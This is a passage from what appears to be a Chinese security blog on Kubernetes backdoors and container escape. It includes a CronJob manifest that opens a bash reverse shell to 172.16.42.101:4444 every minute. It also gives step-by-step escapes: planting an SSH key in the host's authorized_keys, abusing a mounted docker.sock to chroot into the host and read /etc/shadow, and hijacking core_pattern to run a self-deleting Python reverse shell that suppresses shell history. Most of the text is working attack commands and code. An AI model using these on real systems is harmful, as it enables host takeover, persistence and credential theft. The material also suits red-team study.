<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">kubectl apply -f backdoor-daemonset.yaml</span><br><span class="line"></span><br><span class="line">kubectl exec -it backdoor-daemonset-<span class="number">4</span>shzz -- <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line">chroot /near_sandbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-部署K8s-CronJob后门Pod"><a href="#3-3-部署K8s-CronJob后门Pod" class="headerlink" title="3.3 部署K8s CronJob后门Pod"></a>3.3 部署K8s CronJob后门Pod</h3><p>CronJobs 对于创建周期性的、反复重复的任务很有用，例如执行数据备份或者发送邮件。 CronJobs 也可以用来计划在指定时间来执行的独立任务，例如计划当集群看起来很空闲时 执行某个 Job。</p>
<p>pod:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CronJob</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-cronjob</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">&quot;*/1 * * * *&quot;</span></span><br><span class="line">  <span class="attr">jobTemplate:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-cronjob</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">            <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">            <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">/bin/bash</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;/bin/bash &gt;&amp; /dev/tcp/172.16.42.101/4444 0&gt;&amp;1&quot;</span></span><br><span class="line">          <span class="attr">restartPolicy:</span> <span class="string">OnFailure</span></span><br></pre></td></tr></table></figure>

<p>攻击方式：</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#创建后门cronjob</span></span><br><span class="line">kubectl apply -f backdoor-cronjob.yaml</span><br><span class="line"><span class="meta">#查看执行情况</span></span><br><span class="line">kubectl <span class="keyword">get</span> jobs --watch</span><br></pre></td></tr></table></figure>

<p>实际对抗过程中，虽然我们也会对恶意的POD和容器做一定的持久化，但是直接使用 CronJob 的概率却不高。在创建后门POD的时候，直接使用 restartPolicy: Always 就可以方便优雅的进行后门进程的重启和维持，所以对 CronJob 的需求反而没那么高。</p>
<h2 id="5-其他攻击"><a href="#5-其他攻击" class="headerlink" title="5. 其他攻击"></a>5. 其他攻击</h2><p>除了上述常见攻击方式外，还有一些其他的攻击方式，暂时不分析，点到为止。</p>
<p><strong>1. CVE-2018-1002105</strong></p>
<p>CVE-2018-1002105是一个Kubernetes的权限提升漏洞，允许攻击者在拥有集群内低权限的情况下提升权限至Kubernetes API Server权限。所有低于v1.10.11、v1.11.5、v.12.3版本的Kubernetes均受影响。</p>
<p>简单来说，通过构造一个特殊的请求，攻击者能够借助Kubernetes API Server作为代理，建立一个到后端服务器的连接，进而以Kubernetes API Server的身份向后端服务器发送任意请求，实质就是权限提升。</p>
<p><strong>2. CVE-2019-11253:YAML炸弹</strong></p>
<p>CVE-2019-11253是一个存在于API Server对YAML、JSON数据解析流程中的漏洞，恶意的YAML、JSON载荷可能使API Server大量消耗CPU、内存资源，从而导致拒绝服务攻击。</p>
<p><strong>3. CVE-2019-9512/9514: HTTP/2 协议实现存在问题</strong></p>
<p>CVE-2019-9512和CVE-2019-9514存在于Kubernetes依赖的Go语言库net/http和golang.org/x/net/http2中。</p>
<ul>
<li>CVE-2019-9512漏洞使得kubernetes集群存在Ping Flood攻击风险：攻击者可以持续不断向HTTP/2对端发送PING帧，但不读取相应，促使对端维护一个内部队列存储产生的响应帧。如果响应帧入队列效率不高，可消耗大量CPU、内存资源。</li>
<li>CVE-2019-9514漏洞使kubernetes集群存在Reset Flood攻击风险：攻击者可以开启若干个stream,在每个流上发送非法请求，这将促使对端发送一个RST_STREAM帧尝试终止。如果RST_STREAM帧入队列效率不高，可消耗大量CPU、内存资源。</li>
</ul>
<p><strong>4. Kubernetes网络中间人攻击</strong></p>
<p>通过修改kube-dns服务的地址，可以在Kubernetes网络中完成中间人攻击。</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><p>《云原生安全攻防实践与体系构建》</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes安全</tag>
      </tags>
  </entry>
  <entry>
    <title>容器逃逸</title>
    <url>/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<blockquote>
<p>谷神不死，是谓玄牝，玄牝之门，是谓天地根。</p>
</blockquote>
<p>容器逃逸相关手法总结</p>
<span id="more"></span>





<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><h3 id="1-1-容器识别"><a href="#1-1-容器识别" class="headerlink" title="1.1 容器识别"></a>1.1 容器识别</h3><blockquote>
<p>从 CGroup 信息中，不仅可以判断我们是否在容器内，也能很方便判断出当前的容器是否在 Kubernetes 的编排环境中。</p>
</blockquote>
<ul>
<li><p>命令：cat /proc/1/cgroup</p>
</li>
<li><p>结果：</p>
<p>在k8s环境下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@nginx-demo:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">11:cpuset:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br><span class="line">10:cpuacct,cpu:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br><span class="line">9:devices:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br><span class="line">8:blkio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br></pre></td></tr></table></figure>



<p>容器环境:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@250c9269ab90:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">11:rdma:/</span><br><span class="line">10:perf_event:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br><span class="line">9:devices:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br><span class="line">8:blkio:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br><span class="line">7:freezer:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br></pre></td></tr></table></figure>



<ul>
<li>用到的pod</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-deomo</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-2-特权容器识别"><a href="#1-2-特权容器识别" class="headerlink" title="1.2 特权容器识别"></a>1.2 特权容器识别</h3><blockquote>
<p>开启特权模式（privileged）的容器允许容器访问所有宿主机设备。</p>
</blockquote>
<ul>
<li><p>命令：fdisk -l （特权容器会看到磁盘挂载，无特权容器看不到任何信息）</p>
</li>
<li><p>结果：</p>
<p>正常容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@250c9269ab90:/<span class="comment"># fdisk -l</span></span><br><span class="line">root@250c9269ab90:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>特权容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bda49fc3063c:/<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 41 GiB, 44023414784 bytes, 85983232 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x15ec275c</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *        2048 83982335 83980288   40G 83 Linux</span><br><span class="line">/dev/sda2       83984382 85981183  1996802  975M  5 Extended</span><br><span class="line">/dev/sda5       83984384 85981183  1996800  975M 82 Linux swap / Solaris</span><br></pre></td></tr></table></figure>

<p>正常pod:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># fdisk -l</span></span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>特权pod:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 20 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">2610 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type</span><br><span class="line">/dev/sda1 *  0,32,33     130,170,40        2048    2099199    2097152 1024M 83 Linux</span><br><span class="line">/dev/sda2    130,170,41  1023,254,63    2099200   41943039   39843840 18.9G 8e Linux LVM</span><br><span class="line">Disk /dev/dm-0: 17 GB, 18249416704 bytes, 35643392 sectors</span><br><span class="line">2218 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Disk /dev/dm-0 doesn<span class="string">&#x27;t contain a valid partition table</span></span><br><span class="line"><span class="string">Disk /dev/dm-1: 2048 MB, 2147483648 bytes, 4194304 sectors</span></span><br><span class="line"><span class="string">261 cylinders, 255 heads, 63 sectors/track</span></span><br><span class="line"><span class="string">Units: sectors of 1 * 512 = 512 bytes</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用到的pod</p>
<p>正常：kubectl exec -it alpine-test /bin/sh</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">alpine-test</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">alpine-test</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;alpine&quot;</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>特权：kubectl exec -it alpine-privileged /bin/sh</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">apiVersion:</span> v1</span><br><span class="line"><span class="symbol">kind:</span> Pod</span><br><span class="line"><span class="symbol">metadata:</span></span><br><span class="line"><span class="symbol">  name:</span> alpine-privileged</span><br><span class="line"><span class="symbol">spec:</span></span><br><span class="line"><span class="symbol">  containers:</span></span><br><span class="line">  - name: alpine-privileged</span><br><span class="line"><span class="symbol">    image:</span> <span class="string">&quot;alpine&quot;</span></span><br><span class="line"><span class="symbol">    securityContext:</span></span><br><span class="line"><span class="symbol">      privileged:</span> true</span><br><span class="line"><span class="symbol">    command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-3-收集挂载信息"><a href="#1-3-收集挂载信息" class="headerlink" title="1.3 收集挂载信息"></a>1.3 收集挂载信息</h3><blockquote>
<p>挂载危险目录可能导致容器逃逸</p>
</blockquote>
<ul>
<li><p>命令：cat /proc/self/mounts</p>
</li>
<li><p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@94c7b539e243:/<span class="comment"># cat /proc/self/mounts</span></span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/ZLTGXOQUKDQSUUEYOU4LEPOTDT:/var/lib/docker/overlay2/l/ACBJV6BUBICY2UWKF6RUSJL2CK:/var/lib/docker/overlay2/l/PEHRSEOSUK5N4LS3TWGFN5AMPF:/var/lib/docker/overlay2/l/WJJQ32N4WYNZPOBCJU6RYNJSZW:/var/lib/docker/overlay2/l/L2WLPD3OB5VQ4BMALKIS7YQZYS:/var/lib/docker/overlay2/l/FKNSIMUASM2XH4VM7NPQTA7LVH:/var/lib/docker/overlay2/l/JLNADHKMD3V6INRNN6XSWIJJTU:/var/lib/docker/overlay2/l/MNMWFARRFGRRJIB2BPJZKKIPL2:/var/lib/docker/overlay2/l/FQT3GCMVXV66A4XDYNO5ZTIPWZ:/var/lib/docker/overlay2/l/NW7UV3VUTVI4HAZMYJYLFNR7DX:/var/lib/docker/overlay2/l/GQBU5K7FNQ6WKYQ4UZKVE34YDF:/var/lib/docker/overlay2/l/NLQIT2NYYWUOKV6X3HU6V2HM4T:/var/lib/docker/overlay2/l/LQUSKZUHCPUZYHYUNJDK2VYSFC,upperdir=/var/lib/docker/overlay2/516dcfd41ed86e852677c6a0a3c58ba7f3b9e7b5898542f4daba5eafe91d34d0/diff,workdir=/var/lib/docker/overlay2/516dcfd41ed86e852677c6a0a3c58ba7f3b9e7b5898542f4daba5eafe91d34d0/work 0 0</span><br><span class="line">proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0</span><br><span class="line">tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0</span><br><span class="line">devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0</span><br><span class="line">sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0</span><br><span class="line">tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0</span><br><span class="line">cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0</span><br><span class="line">cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noe</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-4-收集特权信息"><a href="#1-4-收集特权信息" class="headerlink" title="1.4 收集特权信息"></a>1.4 收集特权信息</h3><blockquote>
<p>有的特权可导致容器逃逸</p>
</blockquote>
<ul>
<li><p>命令：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>self/status</span><br><span class="line">或者</span><br><span class="line">capsh --<span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">如果没有capsh命令可以</span><br><span class="line">先：cat <span class="regexp">/proc/</span><span class="number">1</span>/status | <span class="keyword">grep</span> Cap</span><br><span class="line">获取结果</span><br><span class="line">然后在自己的机器上进行：capsh --decode=<span class="number">00000000</span>a80425fb</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master testpod]<span class="comment"># capsh --print</span></span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep</span><br><span class="line">Bounding <span class="built_in">set</span> =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36</span><br><span class="line">Securebits: 00/0x0/1<span class="string">&#x27;b0</span></span><br><span class="line"><span class="string"> secure-noroot: no (unlocked</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-5-找到容器在宿主机的根目录"><a href="#1-5-找到容器在宿主机的根目录" class="headerlink" title="1.5 找到容器在宿主机的根目录"></a>1.5 找到容器在宿主机的根目录</h3><blockquote>
<p>找到容器的根目录在很多时候可以帮助我们逃逸，比如在利用procfs挂载进行逃逸的时候</p>
</blockquote>
<p>获取当前容器在宿主机的绝对路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /proc/self/mounts | grep docker</span><br><span class="line">或</span><br><span class="line">cat /proc/mounts | grep docker</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@d30d39f245c9:/tmp<span class="comment"># cat /proc/self/mounts | grep docker</span></span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/LV2YDJ3G5EYUJN5WKESCKZJMDS:/var/lib/docker/overlay2/l/O34WL63RTLQ5HQEM3T7KBT4ZQ5,upperdir=/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c/diff,workdir=/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c/work 0 0</span><br></pre></td></tr></table></figure>

<p>结果中<code>/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c</code>就是容器在宿主机的根目录，</p>
<p>在宿主机中我们切换到该目录查看一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c ls</span><br><span class="line">diff  link  lower  merged  work</span><br></pre></td></tr></table></figure>

<p>==diff: 是我们挂载到容器的目录==</p>
<p>==merged: 容器的根目录==</p>
<h2 id="2-特殊路径挂载导致的容器逃逸"><a href="#2-特殊路径挂载导致的容器逃逸" class="headerlink" title="2. 特殊路径挂载导致的容器逃逸"></a>2. 特殊路径挂载导致的容器逃逸</h2><p>这类的挂载很好理解，当例如宿主机的内的 /, /etc/, /root/.ssh 等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的 /etc/crontab、/root/.ssh/、/root/.bashrc 等文件执行任意命令，就可以导致容器逃逸。</p>
<h3 id="2-1-通过挂载的root目录进行逃逸"><a href="#2-1-通过挂载的root目录进行逃逸" class="headerlink" title="2.1 通过挂载的root目录进行逃逸"></a>2.1 通过挂载的root目录进行逃逸</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 挂载root目录的容器</span></span><br><span class="line">docker run -it --rm -v <span class="regexp">/root:/</span>root debian <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看挂载信息</span></span><br><span class="line">cat <span class="regexp">/proc/</span>self/mounts</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入ssh公钥</span></span><br><span class="line">echo <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRqTYN4ot1TYFk7Q6wTlUlbyGNau91tMdVAkMrzThzf9u83HqYSYs1rIrguv7ThipBhV0KIRZr02AfHlB2mqKXnMun6fMZlkkVVTPFhUV9aaRNIlRBD84AXncPqktY6uL38a6tZ3nxz/qOtYAl59tjQA2OKLF62ZquUNA2JKw2iIdO+o6r84OqA1nusO2oQP01luK53+w+oKZ30KnDRqy4lzrxkxPApHlwfZKPOdrHkMW/Z0Vj4ZXYjoffJoYOUYCFfR36GwZuxjgxkxwJoitTz0GIZxVnG+rkA5Wi3LatFHBHIZJVyrBVC3bxUFIHESvkpZv/fGCFNLChvAKvPHmD1PbA8V4jGT/hibYmxRPwex5SPq6WMBeZ6a3j4tvCkpLRuv7qTC/JwRaCKx6iyqGntkXCP2G59Kvzxxte7ShgHIMEDyrBNmsb47nUy0o6nUTJ2ThDNIIlPtgouVfw4bJ0Dqr5UhIpMsNJyeAa7VWQCeolvWTxvoLJuR8= ss@MacBook-Pro.local&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接登录</span></span><br><span class="line">ssh <span class="number">172.16</span>.<span class="number">42.100</span></span><br></pre></td></tr></table></figure>

<p>挂载的其他目录同理</p>
<h3 id="2-2-挂载Docker-Socket的情况"><a href="#2-2-挂载Docker-Socket的情况" class="headerlink" title="2.2 挂载Docker Socket的情况"></a>2.2 挂载Docker Socket的情况</h3><p>其中一个比较特殊且常见的场景是当宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器。这类的设计被称为： Docker in Docker。常见于需要对当前节点进行容器管理的编排逻辑容器里。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建挂载Docker Socket的场景</span></span><br><span class="line">docker run -it --rm --name debiantest -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>var<span class="regexp">/run/</span>docker.sock -v <span class="regexp">/usr/</span>bin<span class="regexp">/docker:/u</span>sr<span class="regexp">/bin/</span>docker debian</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看挂载信息</span></span><br><span class="line">cat <span class="regexp">/proc/</span>self/mounts | grep docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动一个挂载根目录的容器</span></span><br><span class="line">docker run -it -v <span class="regexp">/:/</span>shadowtest debian <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机根目录</span></span><br><span class="line">chroot /shadowtest</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看用户确认挂载成功</span></span><br><span class="line"><span class="comment"># cat /etc/shadow | grep shadowflow</span></span><br><span class="line">shadowflow:<span class="variable">$6</span><span class="variable">$oNvbnhpdcJooQ</span><span class="variable">$N</span>:<span class="number">7</span>:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h3 id="2-3-挂载procfs的情况"><a href="#2-3-挂载procfs的情况" class="headerlink" title="2.3 挂载procfs的情况"></a>2.3 挂载procfs的情况</h3><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多非常敏感、重要的文件。</p>
<p>一般来说不会将宿主机的procfs挂载到容器中。然而，有些业务为了实现某些特殊需求，还是会将该文件系统挂载进来。</p>
<p>procfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式。从2.6.19内核版本开始，Linux支持在/proc/sys/kernel/core_pattern中使用新语法，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做用户空间程序或脚本解释并执行。那么我们就可以在管道符后写入后门程序达到命令执行的效果。</p>
<ol>
<li><p>创建一个映射proc目录的容器</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -v <span class="regexp">/proc:/</span>host_proc --rm -it debian <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure></li>
<li><p>获取当前容器在宿主机的绝对路径</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>self/mounts | <span class="keyword">grep</span> docker</span><br><span class="line">或</span><br><span class="line">cat <span class="regexp">/proc/m</span>ounts | <span class="keyword">grep</span> docker</span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/<span class="comment"># cat /proc/self/mounts | grep docke</span></span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/QKKB57DGVWIT5IAYNN74NHOKIE:/var/lib/docker/overlay2/l/O34WL63RTLQ5HQEM3T7KBT4ZQ5,upperdir=/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/diff,workdir=/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/work 0 0</span><br></pre></td></tr></table></figure>

<p>根据1.5的知识我们知道容器在宿主机的根目录为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/docker/</span>overlay2<span class="regexp">/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/m</span>erged</span><br></pre></td></tr></table></figure></li>
<li><p>payload改造</p>
<p>我们不能直接用如下payload：</p>
<p><code>echo -e &quot;|/tmp/.x.py \rcore&quot; &gt; /proc/sys/kernel/core_pattern</code></p>
<p>因为程序崩溃的时候宿主机是没办法找到容器内的exp的。</p>
<p>那么我们修改为宿主机目录，并且将proc改为映射的宿主机目录</p>
<p>==最终payload如下：==</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core&quot;</span> &gt; <span class="regexp">/host_proc/</span>sys<span class="regexp">/kernel/</span>core_pattern</span><br></pre></td></tr></table></figure>



<p>x.py可以写成反弹shell的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;172.16.42.100&quot;</span></span><br><span class="line">lport = <span class="number">4444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dv/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>将其写入到/tmp/.x.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | tee /tmp/.x.py</span><br><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;172.16.42.100&quot;</span></span><br><span class="line">lport = <span class="number">4444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span 